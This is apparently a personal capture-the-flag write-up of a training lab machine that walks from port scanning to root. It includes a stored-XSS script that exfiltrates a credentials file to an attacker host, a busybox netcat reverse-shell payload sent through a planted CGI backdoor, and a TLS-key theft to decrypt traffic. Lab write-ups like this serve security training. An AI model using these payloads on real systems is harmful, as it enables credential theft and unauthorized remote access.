- - - 
created : 30-07-2025 

Tags : #medium  
- - - 
# Objective

A combo of compromising and analysis for security enthusiasts.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ rustscan -a whm.thm -- -A  
 
Open 10.10.58.225:21
Open 10.10.58.225:22
Open 10.10.58.225:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.162.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
# Enumeration
## FTP (21)

We have anonymous access, let's download this file :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ ftp anonymous@whm.thm                                                                                                             
Connected to whm.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31671|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.

ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||11312|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |***********************************************************************************************************|   318      344.28 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (5.44 KiB/s)

```

Let's cat it for reading :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ cat update.txt  
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

This is interesting.
## HTTP (80)
### DirSearch

We can use [Dirsearch](../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ dirsearch -u http://whm.thm -t 50 

[16:18:12] 301 -  303B  - /assets  ->  http://whm.thm/assets/      
[16:18:18] 200 -    0B  - /config.php 
[16:18:38] 200 -  282B  - /login.php                                        
[16:18:38] 302 -    0B  - /logout.php  ->  login.php   
[16:18:54] 200 -  374B  - /register.php    
```

/login.php :

![Pasted image 20250730162045.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730162045.png)
No username enumeration.

We try to register and see what's running there :

![Pasted image 20250730163032.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730163032.png)

So now we can comment, let's see this function :

![Pasted image 20250730163105.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730163105.png)
![Pasted image 20250730163231.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730163231.png)

So i tried to trigger [Cross-site Scripting (XSS)](../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md) here, but it won't work, actually you'll discover that we have **XSS** in the username parameter, it appears in the comments so it might be vulnerable.

We can register a user named `<script>alert(1);</script>` and comment something to see the pop-up :

![Pasted image 20250731115851.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731115851.png)

We delete the comment after that to not make confusion in XSS exploiting later, then we log out.
# Exploit

We can [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) the vulnerability in the username parameter ([Cross-site Scripting (XSS)](../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md)) to read the mentioned pass.txt file.
## Payload

First we need our script, we'll make the machine download it and run it by Stored XSS to see the file.

Let’s create a simple script to fetch the **pass.txt** file and send it’s contents to our attacking server :

```bash
fetch('http://127.0.0.1/dir/pass.txt')
  .then(response => response.text())
  .then(data => {
    let attackerServer = 'http://ATTACK_IP:80/catch?data=' + encodeURIComponent(data);
    // Use an Image tag for GET request
    let img = document.createElement('img');
    img.src = attackerServer;
    document.body.appendChild(img);
  });
```

In this case i choosed port 80 for the web server. 
Save the file as **script.js**, and make sure to add the VPN IP address of your attacking machine.

Now we host a simple [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) web server :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ python3 -m http.server 80                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We register as a new user with the following username : ``

```bash
<script src=http://10.8.162.183:80/script.js></script>
```

Now login and write a comment, then check back on your Python web server :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ python3 -m http.server 80                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.162.183 - - [31/Jul/2025 12:25:28] "GET /script.js HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2025 12:25:28] code 404, message File not found
127.0.0.1 - - [31/Jul/2025 12:25:28] "GET /dir/pass.txt HTTP/1.1" 404 -
10.10.100.207 - - [31/Jul/2025 12:26:02] "GET /script.js HTTP/1.1" 200 -
10.10.100.207 - - [31/Jul/2025 12:26:02] code 404, message File not found
10.10.100.207 - - [31/Jul/2025 12:26:02] "GET /catch?data=jack%3AWhyIsMyPasswordSoStrongIDK%0A HTTP/1.1" 404 -

```

You can see a user+password combination. The username is **jack**. Let's URL decode the password :
![Pasted image 20250731122804.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731122804.png)
WhyIsMyPasswordSoStrongIDK
## Foothold SSH (22)

We use the found credentials to log in the server using [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ ssh jack@whm.thm               
The authenticity of host 'whm.thm (10.10.100.207)' can't be established.
ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'whm.thm' (ED25519) to the list of known hosts.
jack@whm.thm's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 31 Jul 2025 10:28:27 AM UTC

  System load:  0.0                Processes:             130
  Usage of /:   79.7% of 11.21GB   Users logged in:       0
  Memory usage: 32%                IPv4 address for eth0: 10.10.100.207
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

64 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon Jan 29 13:44:19 2024
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat user.txt 
1ca4eb201787acbfcf9e70fca87b866a
```

And we have the **user flag**.
# Lateral Movement - Privilege Escalation

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking for privileges :

```bash
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

We can run /usr/sbin/iptables as root, we can see the rules :

```bash
jack@ubuntu:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere   
```

we have port 41312 hidden, let's remove this rule :

```bash
jack@ubuntu:~$ sudo /usr/sbin/iptables -D INPUT 1
jack@ubuntu:~$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
DROP       all  --  anywhere             anywhere            

```

If we explore the server in /opt we find 2 files :

```bash
jack@ubuntu:/$ cd opt
jack@ubuntu:/opt$ ls
capture.pcap  urgent.txt

jack@ubuntu:/opt$ cat urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.

```

Interesting, let's download the .pcap file :

```bash
jack@ubuntu:/opt$ scp jack@10.10.100.207:/opt/capture.pcap .
jack@10.10.100.207's password: 
./capture.pcap: Permission denied
```

Apparently we can't, let's search in the web configurations directories :

```bash
jack@ubuntu:/opt$ cat /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ScriptAlias "/cgi-bin/" "/usr/local/apache2/cgi-bin/"
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        #ErrorLog ${APACHE_LOG_DIR}/error.log
        #CustomLog ${APACHE_LOG_DIR}/access.log combined
        ErrorLog /dev/null

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        #ErrorLog ${APACHE_LOG_DIR}/error.log
        #CustomLog ${APACHE_LOG_DIR}/access.log combined
        ErrorLog /dev/null
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>

```

So we have encrypted traffic in our port and a key.
#### Decrypting TLS traffic

As you can see here, the certifcate is encrypted by a key: **/etc/apache2/certs/apache.key**. This key can be used by [WireShark](../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) to read the packages of port 41312. Now acquire the TLS key by running:

```bash
jack@ubuntu:/opt$ scp jack@10.10.100.207:/etc/apache2/certs/apache.key .
jack@10.10.100.207's password: 
./apache.key: Permission denied
```

I will host a web server with [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) and download pcap file from my machine :

```
jack@ubuntu:/opt$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) .
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ wget http://whm.thm:1337/capture.pcap                                                                    
--2025-07-31 12:50:20--  http://whm.thm:1337/capture.pcap
Risoluzione di whm.thm (whm.thm)... 10.10.100.207
Connessione a whm.thm (whm.thm)|10.10.100.207|:1337... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 27247 (27K) [application/vnd.tcpdump.pcap]
Salvataggio in: «capture.pcap»

capture.pcap                          100%[=========================================================================>]  26,61K  86,6KB/s    in 0,3s    

2025-07-31 12:50:21 (86,6 KB/s) - «capture.pcap» salvato [27247/27247]

```

Now the key in the right directory, another simple server :

```bash
jack@ubuntu:/etc/apache2/certs$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...       
```

And download : 

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ wget http://whm.thm:1337/apache.key  
--2025-07-31 12:53:54--  http://whm.thm:1337/apache.key
Risoluzione di whm.thm (whm.thm)... 10.10.100.207
Connessione a whm.thm (whm.thm)|10.10.100.207|:1337... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 3272 (3,2K) [application/pgp-keys]
Salvataggio in: «apache.key»

apache.key                            100%[=========================================================================>]   3,20K  --.-KB/s    in 0,001s  

2025-07-31 12:53:54 (2,92 MB/s) - «apache.key» salvato [3272/3272]
```

Now we are able to decrypt the traffic.
## WireShark

We open the pcap file with [Wireshark](../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) then go to Edit → preferences → Protocols → TLS → RSA key list → Edit :

![Pasted image 20250731125859.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731125859.png)
![Pasted image 20250731130204.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731130204.png)

In [Wireshark](../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) you can filter these packages by the following filter:

![Pasted image 20250731130306.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731130306.png)

We can see a shell is visited several times :

![Pasted image 20250731130527.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731130527.png)

We can use this hacker [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) to get access ourself.
## Payload

We have to craft the [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) so first we need a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) and i will get it from https://www.revshells.com/ :

```
busybox nc 10.8.162.183 1337 -e sh
```

We copy that then URL encode it here https://www.urlencoder.org/

Now add it to the original URL : `/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=PAYLOAD

We can open our [[Netcat]] listener on the same port specified in the revshell :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...

```

Opening the URL we get the root shell, let's cat the root flag, we can easily privesc executing the `sudo su` command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/WhyHackMe]
└─$ nc -lvnp 1337              
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.100.207] 49948
whoami
www-data
sudo su
whoami
root
cat /root/root.txt
4dbe2259ae53846441cc2479b5475c72

```

Pwned !!